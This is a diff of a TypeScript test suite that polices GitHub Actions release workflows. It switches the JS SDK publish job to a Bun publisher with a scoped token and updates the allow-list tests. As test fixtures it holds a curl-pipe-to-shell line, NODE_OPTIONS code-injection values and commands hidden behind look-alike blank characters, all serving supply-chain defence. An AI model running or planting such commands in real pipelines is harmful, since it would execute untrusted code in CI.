@@ -317,6 +317,15 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> =>
     oidcJobs(source).flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));
 
+  const policyJobs = (source: string | OidcWorkflow, allowed: FileAllowList): Array<[string, OidcJob]> => {
+    const workflow = loadOidcWorkflow(source);
+    return Object.entries(workflow.jobs ?? {}).filter(
+      ([name, def]) =>
+        grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions) ||
+        Object.hasOwn(allowed.jobs, name),
+    );
+  };
+
   // Exact by default, which is what the searches for a forbidden installer need; a check that a command IS
   // there passes the conservative reading.
   const oidcJobRuns = (
@@ -343,11 +352,10 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const pythonInstallsInOidcJobs = (source: string | OidcWorkflow): string[] =>
     oidcJobRuns(source).flatMap(({ job, run }) => [...run.matchAll(PYTHON_INSTALL)].map(m => `${job}: ${m[0]}`));
 
-  // Non-vacuity: the JS SDK release job installs its own npm, so the finder must see it.
-  it('finds the global npm install in the JS SDK publish job', () => {
-    expect(globalInstallsInOidcJobs('js-sdk-release.yml').map(entry => entry.spec)).toEqual([
-      expect.stringMatching(/^npm@/),
-    ]);
+  // The Bun publisher uses a narrowly scoped registry token, not an OIDC-capable npm install job.
+  it('keeps the JS SDK Bun publisher outside the id-token install scan', () => {
+    expect(oidcJobs('js-sdk-release.yml')).toEqual([]);
+    expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([]);
   });
 
   it('treats a job that inherits id-token: write or write-all from the workflow as able to mint', () => {
@@ -540,35 +548,26 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const EM_DASH = DASH_GLYPHS[1];
 
   const SDK_PUBLISH_KEYS = {
-    stepKeys: ['name', 'uses', 'run', 'with'],
+    stepKeys: ['name', 'uses', 'run', 'with', 'env'],
     jobKeys: ['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps'],
-    permissions: { contents: 'read', 'id-token': 'write' },
+    permissions: { contents: 'read' },
     runsOn: 'ubuntu-latest',
     needs: ['build'],
     timeout: 15,
   };
-  // The npm that comes with the Node image cannot do trusted publishing, so the job installs one, pinned
-  // to an exact release, and only then uploads the tarball its build job made.
+  const PYTHON_PUBLISH_KEYS = {
+    ...SDK_PUBLISH_KEYS,
+    permissions: { contents: 'read', 'id-token': 'write' },
+    stepKeys: ['name', 'uses', 'run', 'with'],
+  };
+  // Publishing is isolated from build code and receives only the scoped registry token.
   const JS_PUBLISH: StepTemplate[] = [
-    { uses: 'actions/setup-node', with: { 'node-version': /^\d+$/ } },
-    {
-      name: 'Use an npm that supports trusted publishing',
-      run: [
-        /^npm install -g npm@\d+\.\d+\.\d+$/,
-        'npm_bundle_dir="$(npm root --global)/npm/node_modules"',
-        `node -e "if (require(process.argv[1]).version !== '6.29.0') throw new Error('Recheck npm Undici replacement');" "$npm_bundle_dir/undici/package.json"`,
-        'npm_http_patch_dir=$(mktemp -d)',
-        'npm install --prefix "$npm_http_patch_dir" --no-save --package-lock=false --ignore-scripts --no-audit --fund=false undici@6.29.1',
-        'rm -rf "$npm_bundle_dir/undici"',
-        'mv "$npm_http_patch_dir/node_modules/undici" "$npm_bundle_dir/undici"',
-        'rm -rf "$npm_http_patch_dir"',
-        'npm --version',
-      ],
-    },
+    { name: 'Setup Bun', uses: 'oven-sh/setup-bun', with: { 'bun-version-file': '.bun-version' } },
     { uses: 'actions/download-artifact', with: { name: 'js-sdk-package', path: 'package/' } },
     {
-      name: 'Publish to npm (trusted publishing, provenance automatic)',
-      run: ['npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public --ignore-scripts'],
+      name: 'Publish to the npm registry',
+      env: { NPM_CONFIG_TOKEN: '${{ secrets.NPM_CONFIG_TOKEN }}' },
+      run: ['bun publish "$GITHUB_WORKSPACE"/package/*.tgz --access public'],
     },
   ];
   const JS_SDK_RELEASE: FileAllowList = {
@@ -586,7 +585,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
   ];
   const PYTHON_SDK_RELEASE: FileAllowList = {
     workflowEnv: [],
-    jobs: { publish: { ...SDK_PUBLISH_KEYS, steps: PYTHON_PUBLISH, ...flatten(PYTHON_PUBLISH) } },
+    jobs: { publish: { ...PYTHON_PUBLISH_KEYS, steps: PYTHON_PUBLISH, ...flatten(PYTHON_PUBLISH) } },
   };
   // The re-point is safe only because of the order: log in, name the image, attest the tested digest, then
   // move the tags, each checked to resolve to that digest, then verify what the public can pull. The first
@@ -715,7 +714,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const expressionsIn = (text: string): number => text.split('${{').length - 1;
 
   const outsideAllowList = (source: string | OidcWorkflow, allowed: FileAllowList = JS_SDK_RELEASE): string[] => {
-    const jobs = oidcJobs(source);
+    const jobs = policyJobs(source, allowed);
     if (jobs.length === 0) return [];
     const workflow = loadOidcWorkflow(source);
     const found: string[] = [];
@@ -796,7 +795,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
   // mismatches behind it.
   const outsideStepTemplate = (source: string | OidcWorkflow, allowed: FileAllowList): string[] => {
     const found: string[] = [];
-    for (const [job, def] of oidcJobs(source)) {
+    for (const [job, def] of policyJobs(source, allowed)) {
       const template = Object.hasOwn(allowed.jobs, job) ? allowed.jobs[job].steps : undefined;
       if (!template) {
         found.push(`${job}: no step template`);
@@ -877,18 +876,15 @@ describe('a job that can mint a publish credential pins global npm installs and 
     return found;
   };
 
-  it('js-sdk-release.yml: the id-token job runs only the pinned npm and the publish', () => {
-    // Non-vacuity: the finder sees the publish step.
+  it('js-sdk-release.yml: the Bun publish job uses only the registry token', () => {
+    const workflow = loadOidcWorkflow('js-sdk-release.yml');
+    const job = jobOf(workflow, 'publish');
+    expect((job.permissions as Record<string, string>)['id-token']).toBeUndefined();
     expect(
-      oidcJobRuns('js-sdk-release.yml', executableLinesConservative).some(({ run }) => /^npm publish\b/m.test(run)),
+      stepsOf(workflow, 'publish').some(step => /^bun publish\b/m.test(executableLinesConservative(step.run ?? ''))),
     ).toBe(true);
+    expect(stepsOf(workflow, 'publish').at(-1)?.env).toEqual({ NPM_CONFIG_TOKEN: '${{ secrets.NPM_CONFIG_TOKEN }}' });
     expect(outsideAllowList('js-sdk-release.yml')).toEqual([]);
-    // The workflow says it installs the npm the image does; nothing else holds the two pins together.
-    const imageNpm = /^RUN npm install -g (npm@\d+\.\d+\.\d+) /m.exec(
-      fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8'),
-    )?.[1];
-    expect(imageNpm).toBeDefined();
-    expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([{ job: 'publish', spec: imageNpm }]);
   });
 
   // Every workflow is read against its own list, so an id-token job anywhere that has none (a new
@@ -900,7 +896,6 @@ describe('a job that can mint a publish credential pins global npm installs and 
         .filter(([, names]) => names.length > 0),
     );
     expect(named).toEqual({
-      'js-sdk-release.yml': ['publish'],
       'python-sdk-release.yml': ['publish'],
       'release.yml': ['promote'],
     });
@@ -929,17 +924,12 @@ describe('a job that can mint a publish credential pins global npm installs and 
         steps: (def.steps ?? []).length,
       })),
     );
-    expect(lengths.map(entry => entry.job)).toEqual([
-      'js-sdk-release.yml:publish',
-      'python-sdk-release.yml:publish',
-      'release.yml:promote',
-    ]);
+    expect(lengths.map(entry => entry.job)).toEqual(['python-sdk-release.yml:publish', 'release.yml:promote']);
     expect(lengths.filter(entry => entry.template === 0 || entry.template !== entry.steps)).toEqual([]);
   });
 
-  it('js-sdk-release.yml: names what the allow-list refuses in an id-token job', () => {
-    // What the job is listed at, so that each case below departs from the list in one place only.
-    const grant = { contents: 'read', 'id-token': 'write' };
+  it('js-sdk-release.yml: refuses commands outside the Bun publisher allow-list', () => {
+    const grant = { contents: 'read' };
     const placed = { 'runs-on': 'ubuntu-latest', needs: 'build', 'timeout-minutes': 15 };
     const run = (commands: string): OidcWorkflow => ({
       jobs: { publish: { ...placed, permissions: grant, steps: [{ run: commands }] } },
@@ -971,7 +961,9 @@ describe('a job that can mint a publish credential pins global npm installs and 
     ]) {
       expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
     }
-    expect(outsideAllowList(run('# npm install\nnpm --version\n'))).toEqual([]);
+    expect(
+      outsideAllowList(run('# bun publish\nbun publish "$GITHUB_WORKSPACE"/package/*.tgz --access public\n')),
+    ).toEqual([]);
     const withAction: OidcWorkflow = {
       jobs: {
         publish: {
@@ -996,13 +988,21 @@ describe('a job that can mint a publish credential pins global npm installs and 
       outsideAllowList(
         keyed({ steps: [{ run: 'npm --version', env: { NODE_OPTIONS: '--import data:text/javascript,x' } }] }),
       ),
-    ).toEqual(['publish: step key env']);
+    ).toEqual(['publish: step env NODE_OPTIONS', 'publish: npm --version']);
     expect(outsideAllowList(keyed({ steps: [{ run: 'npm --version', shell: 'node {0}' }] }))).toEqual([
       'publish: step key shell',
+      'publish: npm --version',
     ]);
     expect(
       outsideAllowList(
-        keyed({ steps: [{ uses: `actions/setup-node@${sha}`, with: { 'node-version': '22', cache: 'npm' } }] }),
+        keyed({
+          steps: [
+            {
+              uses: `oven-sh/setup-bun@${sha}`,
+              with: { 'bun-version-file': '.bun-version', cache: 'bun' },
+            },
+          ],
+        }),
       ),
     ).toEqual(['publish: with cache']);
     expect(outsideAllowList(keyed({ env: { NODE_OPTIONS: '--require x' }, steps: [] }))).toEqual([
@@ -1014,9 +1014,11 @@ describe('a job that can mint a publish credential pins global npm installs and 
     // What the job holds is bounded as well: a second scope, write-all, a grant it only inherits, and a
     // scope it has let go of.
     expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write', contents: 'write' }, steps: [] }))).toEqual([
+      'publish: permission id-token: write',
       'publish: permission contents: write',
     ]);
     expect(outsideAllowList(keyed({ permissions: { 'id-token': 'write' }, steps: [] }))).toEqual([
+      'publish: permission id-token: write',
       'publish: permission contents: none',
     ]);
     expect(outsideAllowList(keyed({ permissions: 'write-all', steps: [] }))).toEqual([
@@ -1448,53 +1450,16 @@ describe('a job that can mint a publish credential pins global npm installs and 
 
   it('js-sdk-release.yml: names the step of the publish job that a change lands on', () => {
     const steps = (w: OidcWorkflow): Step[] => stepsOf(w, 'publish');
-    const SETUP = 'actions/setup-node';
-    const NPM = 'Use an npm that supports trusted publishing';
+    const SETUP = 'Setup Bun';
     const DOWNLOAD = 'actions/download-artifact';
-    const PUBLISH = 'Publish to npm (trusted publishing, provenance automatic)';
-    const [setup, npm, download, publish] = [SETUP, NPM, DOWNLOAD, PUBLISH].map(name => place(JS_PUBLISH, name));
-    const npmRun = scriptOf(JS_PUBLISH, npm);
-    const lastNpm = show(npmRun[npmRun.length - 1]);
+    const PUBLISH = 'Publish to the npm registry';
+    const [setup, download, publish] = [SETUP, DOWNLOAD, PUBLISH].map(name => place(JS_PUBLISH, name));
     const publishLine = show(scriptOf(JS_PUBLISH, publish)[0]);
     expectOutsideTemplate('js-sdk-release.yml', [
-      ...(
-        [
-          ['a floating HTTP client pin', 4, 'undici@6.29.1', 'undici@latest'],
-          ['HTTP client install scripts enabled', 4, ' --ignore-scripts', ''],
-          ['removal outside the HTTP client package', 5, '"$npm_bundle_dir/undici"', '"$npm_bundle_dir"'],
-        ] as const
-      ).map(([label, index, from, to]): TemplateCase => {
-        const original = show(npmRun[index]);
-        const changed = original.replace(from, to);
-        return [
-          label,
-          w => swap(steps(w)[npm], original, changed),
-          [`publish step ${npm + 1} "${NPM}": run line ${index + 1}: ${changed}, expected ${original}`],
-        ];
-      }),
-      [
-        'the publish ahead of the npm it needs',
-        exchange('publish', npm, publish),
-        traded('publish', [npm, NPM], [publish, PUBLISH]),
-        true,
-      ],
       [
         'the download twice',
         w => void steps(w).splice(download + 1, 0, { ...steps(w)[download] }),
         [`publish: step "${DOWNLOAD}" appears 2 times, expected 1`],
-        true,
-      ],
-      ['the npm install removed', w => void steps(w).splice(npm, 1), [`publish: step "${NPM}" is missing`], true],
-      [
-        'a permitted line twice in the step',
-        w => (steps(w)[npm].run = `${steps(w)[npm].run ?? ''}${lastNpm}\n`),
-        [`publish step ${npm + 1} "${NPM}": run line ${npmRun.length + 1}: ${lastNpm}, expected the script to end`],
-        true,
-      ],
-      [
-        'the permitted lines in the other order',
-        w => exchangeLines(steps(w)[npm], [0, npmRun[0]], [1, npmRun[1]]),
-        [`publish step ${npm + 1} "${NPM}": run line 1: ${show(npmRun[1])}, expected ${show(npmRun[0])}`],
         true,
       ],
       [
@@ -1510,10 +1475,16 @@ describe('a job that can mint a publish credential pins global npm installs and 
         [`publish step ${download + 1} "${DOWNLOAD}": with is not a mapping`],
       ],
       [
-        'a node version of another shape',
-        w => (inputsOf(steps(w)[setup])['node-version'] = 'latest'),
+        'a Bun version file of another shape',
+        w => (inputsOf(steps(w)[setup])['bun-version-file'] = 'latest'),
+        [`publish step ${setup + 1} "${SETUP}": with bun-version-file: latest, expected .bun-version`],
+      ],
+      [
+        'an unexpected publisher environment value',
+        w => ((steps(w)[publish].env ??= {}).NPM_CONFIG_TOKEN = 'unscoped-token'),
         [
-          `publish step ${setup + 1} "${SETUP}": with node-version: latest, expected ${show(JS_PUBLISH[setup].with?.['node-version'] ?? '')}`,
+          `publish step ${publish + 1} "${PUBLISH}": env NPM_CONFIG_TOKEN: unscoped-token, expected ` +
+            '${{ secrets.NPM_CONFIG_TOKEN }}',
         ],
       ],
     ]);
@@ -1717,15 +1688,13 @@ describe('a job that can mint a publish credential pins global npm installs and 
   });
 
   it('js-sdk-release.yml: names what the allow-list refuses in the publish job', () => {
-    const NPM = 'Use an npm that supports trusted publishing';
-    const PUBLISH = 'Publish to npm (trusted publishing, provenance automatic)';
+    const PUBLISH = 'Publish to the npm registry';
     const step = (w: OidcWorkflow, name: string): Step => {
       const found = stepsOf(w, 'publish').find(item => item.name === name);
       if (!found) throw new Error(`no step ${name}`);
       return found;
     };
     const publishLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, PUBLISH))[0]);
-    const npmLine = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, NPM))[1]);
     expectRefused('js-sdk-release.yml', [
       ...placing('publish', ['build']),
       ...commented(publishLine).map(([where, text]): [string, Edit, string[]] => [
@@ -1733,11 +1702,11 @@ describe('a job that can mint a publish credential pins global npm installs and 
         w => swap(step(w, PUBLISH), publishLine, text),
         [inComment('publish', PUBLISH)],
       ]),
-      ...commented(npmLine).map(([where, text]): [string, Edit, string[]] => [
-        `an expression in a comment ${where} the npm check`,
-        w => swap(step(w, NPM), npmLine, text),
-        [inComment('publish', NPM)],
-      ]),
+      [
+        'an extra command after the publish',
+        w => (step(w, PUBLISH).run = `${publishLine}\necho extra`),
+        ['publish: echo extra'],
+      ],
     ]);
   });
 
@@ -1761,7 +1730,9 @@ describe('a job that can mint a publish credential pins global npm installs and 
     it.each(Object.keys(ALLOW_LISTS))('%s: a Dependabot bump of every action is accepted', file => {
       const { found, workflow } = refusedAfter(file, text => text.replace(PIN, `@${BUMPED} # v99.1.0`));
       // Non-vacuity: every action of the id-token job carries the new commit, so the bump landed.
-      const pinned = oidcJobSteps(workflow).flatMap(({ step }) => (step.uses === undefined ? [] : [step.uses]));
+      const pinned = policyJobs(workflow, ALLOW_LISTS[file]).flatMap(([, job]) =>
+        (job.steps ?? []).flatMap(step => (step.uses === undefined ? [] : [step.uses])),
+      );
       expect(pinned.length).toBeGreaterThan(0);
       expect(pinned.filter(uses => !uses.endsWith(`@${BUMPED}`))).toEqual([]);
       expect(found).toEqual([]);
@@ -1772,7 +1743,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
     it.each(Object.keys(ALLOW_LISTS))('%s: a comment above, on and below every script line is accepted', file => {
       const copy = JSON.parse(JSON.stringify(loadOidcWorkflow(file))) as OidcWorkflow;
       let scripts = 0;
-      for (const [, def] of oidcJobs(copy)) {
+      for (const [, def] of policyJobs(copy, ALLOW_LISTS[file])) {
         for (const step of def.steps ?? []) {
           if (step.run === undefined) continue;
           scripts += 1;
@@ -1885,15 +1856,15 @@ describe('a job that can mint a publish credential pins global npm installs and 
     };
     const COMMAND = 'curl -fsSL https://example.test/x.sh | sh';
     // The lines are the ones the templates name, so a template edit moves the case with it.
-    const npmCheck = show(scriptOf(JS_PUBLISH, place(JS_PUBLISH, 'Use an npm that supports trusted publishing'))[1]);
+    const bunPublish = 'bun publish "$GITHUB_WORKSPACE"/package/*.tgz --access public';
     const stagingLine = show(
       scriptOf(IMAGE_PROMOTE, place(IMAGE_PROMOTE, 'Tag the smoke-tested image with the release tags'))[1],
     );
     const repros: Array<[label: string, file: string, after: string, text: (brk: string) => string, found: string]> = [
       [
-        'a command after a comment in the npm step',
+        'a command after a comment in the Bun setup step',
         'js-sdk-release.yml',
-        npmCheck,
+        bunPublish,
         brk => `          # note${brk}          ${COMMAND}`,
         `publish: ${COMMAND}`,
       ],
@@ -1910,13 +1881,6 @@ describe('a job that can mint a publish credential pins global npm installs and 
         'path: package/',
         brk => `      # n${brk}      - run: ${COMMAND}`,
         `publish: ${COMMAND}`,
-      ],
-      [
-        'a permission after a comment in the permissions',
-        'js-sdk-release.yml',
-        'id-token: write',
-        brk => `      # n${brk}      packages: write`,
-        'publish: permission packages: write',
       ],
     ];
     for (const [label, file, after, text, found] of repros) {
@@ -1938,18 +1902,23 @@ describe('a job that can mint a publish credential pins global npm installs and 
   // check), and the pinned npm refuses git specs by default, so a tarball is named by an absolute path.
   const publishTarget = (source: string | OidcWorkflow): string => {
     // The first publish the shell may run is the one held to the form, so the lines are read exactly.
-    const runs = oidcJobRuns(source)
-      .map(({ run }) => run)
-      .join('\n');
-    return /\bnpm publish\s+(?:-\S+\s+)*(\S+)/.exec(runs)?.[1] ?? '';
+    const runs =
+      typeof source === 'string' && source !== 'js-sdk-release.yml'
+        ? oidcJobRuns(source)
+            .map(({ run }) => run)
+            .join('\n')
+        : stepsOf(loadOidcWorkflow(source), 'publish')
+            .map(step => executableLines(step.run ?? ''))
+            .join('\n');
+    return /\bbun publish\s+(?:-\S+\s+)*(\S+)/.exec(runs)?.[1] ?? '';
   };
   const FILE_FORM = /^(?:"?\$\{?GITHUB_WORKSPACE\}?"?|)\/[^\s]*\.tgz$/;
 
-  it('js-sdk-release.yml: the publish step names the tarball in a form npm reads as a file', () => {
+  it('js-sdk-release.yml: the publish step names the tarball as an absolute file path', () => {
     expect(publishTarget('js-sdk-release.yml')).toMatch(FILE_FORM);
   });
 
-  it('js-sdk-release.yml: refuses a first publish that names a path npm reads as a repository', () => {
+  it('js-sdk-release.yml: refuses a first publish that names a relative tarball path', () => {
     const copy = (run: string): OidcWorkflow => {
       const workflow = JSON.parse(JSON.stringify(loadOidcWorkflow('js-sdk-release.yml'))) as OidcWorkflow;
       stepsOf(workflow, 'publish').unshift({ run });
@@ -1957,11 +1926,11 @@ describe('a job that can mint a publish credential pins global npm installs and 
     };
     // A `#` after a blank the shell does not skip is no comment, so the publish after the `;` runs first.
     for (const blank of [...BLANK_LOOKALIKES, String.fromCharCode(0x2028)]) {
-      expect(publishTarget(copy(`echo x${blank}#; npm publish package/x.tgz`))).not.toMatch(FILE_FORM);
+      expect(publishTarget(copy(`echo x${blank}#; bun publish package/x.tgz`))).not.toMatch(FILE_FORM);
     }
-    expect(publishTarget(copy('npm publish package/x.tgz'))).not.toMatch(FILE_FORM);
+    expect(publishTarget(copy('bun publish package/x.tgz'))).not.toMatch(FILE_FORM);
     // Behind a space it is a comment, which is not a publish.
-    expect(publishTarget(copy('echo x # npm publish package/x.tgz'))).toMatch(FILE_FORM);
+    expect(publishTarget(copy('echo x # bun publish package/x.tgz'))).toMatch(FILE_FORM);
   });
 
   // The caches a setup action restores are written by jobs that run third-party test code. A job that
@@ -2078,13 +2047,13 @@ describe('a publish job takes the artifact its build job uploads', () => {
   // Read exactly: the first publish line the shell may run is the one that has to name the artifact.
   const runsOf = (job: FlowJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
 
-  it('js-sdk-release.yml: the tarball npm pack writes is the one the publish step names', () => {
+  it('js-sdk-release.yml: the tarball bun pm pack writes is the one the publish step names', () => {
     const { build, publish } = jobsOf('js-sdk-release.yml');
     const upload = only(build, 'actions/upload-artifact');
     const download = only(publish, 'actions/download-artifact');
-    // `npm pack` writes into the working directory of its step, and the upload names that directory's
+    // `bun pm pack` writes into the working directory of its step, and the upload names that directory's
     // tarballs: one pattern, one level, so one search path and no directory in the stored name.
-    const pack = (build.steps ?? []).findIndex(step => /^npm pack$/m.test(executableLines(step.run ?? '')));
+    const pack = (build.steps ?? []).findIndex(step => /^bun pm pack$/m.test(executableLines(step.run ?? '')));
     expect(pack).toBeGreaterThan(-1);
     expect(pack).toBeLessThan((build.steps ?? []).indexOf(upload));
     expect((build.steps ?? [])[pack]['working-directory']).toBeUndefined();
@@ -2093,11 +2062,11 @@ describe('a publish job takes the artifact its build job uploads', () => {
     // The two jobs agree on the artifact and on where it lands, and the download runs first.
     expect(download.with?.name).toBe(upload.with?.name);
     expect([publish.needs ?? []].flat()).toContain('build');
-    const target = /^npm publish\s+(?:-\S+\s+)*(\S+)/m.exec(runsOf(publish))?.[1];
+    const target = /^bun publish\s+(?:-\S+\s+)*(\S+)/m.exec(runsOf(publish))?.[1];
     expect(target).toBe(
       `"$GITHUB_WORKSPACE"/${dirOf(download.with?.path)}/${path.posix.basename(upload.with?.path ?? '')}`,
     );
-    const publishAt = (publish.steps ?? []).findIndex(step => /^npm publish\b/m.test(executableLines(step.run ?? '')));
+    const publishAt = (publish.steps ?? []).findIndex(step => /^bun publish\b/m.test(executableLines(step.run ?? '')));
     expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(publishAt);
   });
 
@@ -2415,18 +2384,18 @@ describe('the dashboard unit tests are bounded', () => {
     expect(scripts['test:cov']).toMatch(/--test-timeout=\d+/);
     // --test-force-exit would hide the very leak the timeout exposes.
     expect(scripts['test:unit']).not.toContain('--test-force-exit');
-    expect(scripts.test).toBe('npm run test:unit');
+    expect(scripts.test).toBe('bun run test:unit');
   });
 
   type TimedStep = Step & { 'timeout-minutes'?: unknown };
   type TimedWorkflow = { jobs?: Record<string, { steps?: TimedStep[] }> };
   // One step runs the tests, and its bound is a number. Both readings, since each half is its own question:
   // a step that certainly runs them has to be there once, and every step the shell may run them in has to
-  // carry the bound, or a second one written as `echo x<U+00A0>#; npm run test:unit` runs with none.
+  // carry the bound, or a second one written as `echo x<U+00A0>#; bun run test:unit` runs with none.
   const unitTestProblems = (workflow: TimedWorkflow): string[] => {
     const steps = Object.values(workflow.jobs ?? {}).flatMap(job => job.steps ?? []);
     const running = (read: (run: string) => string): TimedStep[] =>
-      steps.filter(step => read(step.run ?? '').includes('npm run test:unit'));
+      steps.filter(step => read(step.run ?? '').includes('bun run test:unit'));
     const found: string[] = [];
     const certain = running(executableLinesConservative).length;
     if (certain !== 1) found.push(`${certain} steps certainly run the unit tests, expected 1`);
@@ -2448,7 +2417,7 @@ describe('the dashboard unit tests are bounded', () => {
     for (const blank of [...BLANK_LOOKALIKES, String.fromCharCode(0x2028)]) {
       const code = `U+${blank.charCodeAt(0).toString(16)}`;
       const second = copy();
-      dashboard(second).push({ run: `echo x${blank}#; npm run test:unit` });
+      dashboard(second).push({ run: `echo x${blank}#; bun run test:unit` });
       expect([code, unitTestProblems(second)]).toEqual([
         code,
         ['2 steps may run the unit tests, expected 1', 'a step that may run the unit tests has no bound'],
@@ -2457,12 +2426,12 @@ describe('the dashboard unit tests are bounded', () => {
     // The step that runs them, with its bound taken off, and with the command only named behind a `#`.
     const unbounded = copy();
     for (const step of dashboard(unbounded)) {
-      if ((step.run ?? '').includes('npm run test:unit')) delete step['timeout-minutes'];
+      if ((step.run ?? '').includes('bun run test:unit')) delete step['timeout-minutes'];
     }
     expect(unitTestProblems(unbounded)).toEqual(['a step that may run the unit tests has no bound']);
     const named = copy();
     for (const step of dashboard(named)) {
-      if ((step.run ?? '').includes('npm run test:unit')) step.run = `echo x${BLANK_LOOKALIKES[0]}# npm run test:unit`;
+      if ((step.run ?? '').includes('bun run test:unit')) step.run = `echo x${BLANK_LOOKALIKES[0]}# bun run test:unit`;
     }
     expect(unitTestProblems(named)).toEqual(['0 steps certainly run the unit tests, expected 1']);
   });
